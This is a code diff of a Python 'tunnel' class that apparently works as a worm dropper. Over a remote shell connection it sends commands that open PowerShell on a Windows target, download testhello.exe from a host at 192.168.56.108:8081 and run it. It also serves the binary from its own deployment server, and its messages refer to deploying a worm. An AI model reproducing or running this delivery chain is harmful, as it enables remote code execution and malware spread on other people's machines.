@@ -1,6 +1,7 @@
 import socket, threading
 import time
 from replicate import replicate
+from deployment import deployment
 
 
 class tunnel(threading.Thread):
@@ -22,20 +23,20 @@ class tunnel(threading.Thread):
         conn.settimeout(5.0)
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
-        self.deploy_virus(replicate("container/testhello.exe"))
+        self.deploy_virus(replicate("container/testhello.exe").getfiledata(),conn)
     
     
-    def sent_command(self, command):
+    def sent_command(self, command, conn):
         print(command)
-        self.conn.send(command)
+        conn.send(command)
         time.sleep(1)
         
-    def get_response(self):
-        response = self.conn.recv(1024).decode()
+    def get_response(self,conn):
+        response = conn.recv(1024).decode()
         return response
     
-    def delivery_virus(self, target_ip, virus):
-        self.get_connection(target_ip).sendall(virus)
+    # def delivery_virus(self, target_ip, virus):
+    #     self.get_connection(target_ip).sendall(virus)
 
 
     def generate_base64_bind_shell_code(self, ostype:str):
@@ -62,64 +63,47 @@ class tunnel(threading.Thread):
             return ""
         else:
             return ""
-        
-    def deploy_virus(self, data, ostype="windows"):
-        serversocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        host = "0.0.0.0"
-        port = 8081
-        serversocket.bind((host,port))
-        serversocket.listen(5)
-        print("Deployment Server listening on port", port)
+
+    def deploy_virus(self, data, conn, ostype="windows"):
+        print(data)
+        server = deployment("0.0.0.0",8081,data)
+        server.start()
         
         if ostype=="windows":
-            self.depoly_to_windows()
+            self.depoly_to_windows(conn)
         else:
-            self.deploy_to_linux()
-        
-        clientsocket,addr = serversocket.accept()
-        print("Got a connection from", addr)
-        try:
-            binary_content = data.read()
-            chunk_size = 1024
-            for i in range(0, len(binary_content), chunk_size):
-                clientsocket.sendall(binary_content[i:i+chunk_size])
-        except FileNotFoundError:
-            clientsocket.sendall(b'File not found')
-        except Exception:
-            print("error on deploy:")
-        clientsocket.close()
-        serversocket.close()
-     
+            self.deploy_to_linux(conn)
             
-    def depoly_to_windows(self):
+            
+    def depoly_to_windows(self,conn):
         #start command sequence
         try:
-            start = input("press enter to start")
+            print("Start Deploying worm to Windows")
             command = "cd \\users".encode()
             command+=b"\n"
-            c.sent_command(command)
+            self.sent_command(command,conn)
             print("change to users directory")
-            print(c.get_response())
+            print(self.get_response(conn))
             command = "powershell".encode()
             command+=b"\n"
-            c.sent_command(command)
+            self.sent_command(command,conn)
             print("run powershell")
-            print(c.get_response())
+            print("Target Response: {}".format(self.get_response(conn)))
             command = '$client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.56.108", 8081); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $receivedBytes = 0; $totalBytes = 0; $file = New-Object System.IO.FileStream("testhello.exe", [System.IO.FileMode]::Create); do { $receivedBytes = $stream.Read($buffer, 0, 1024); $totalBytes += $receivedBytes; $file.Write($buffer, 0, $receivedBytes); } while ($receivedBytes -ne 0); $file.Close(); $client.Close();'.encode()
             command+=b"\n"
-            c.sent_command(command)
+            self.sent_command(command,conn)
             print("target machine is starting to connect to the us")
-            print(c.get_response())
-            time.sleep(3)
+            print("Target Response: {}".format(self.get_response(conn)))
+            time.sleep(5)
             command = "./testhello.exe".encode()
             command+=b"\n"
-            c.sent_command(command)
-            print(c.get_response())
+            self.sent_command(command,conn)
+            print("Target Response: {}".format(self.get_response(conn)))
         except TimeoutError as t:
             print("no Response")
             
             
-    def depoly_to_linux(self):
+    def depoly_to_linux(self, conn):
         pass        
     
     
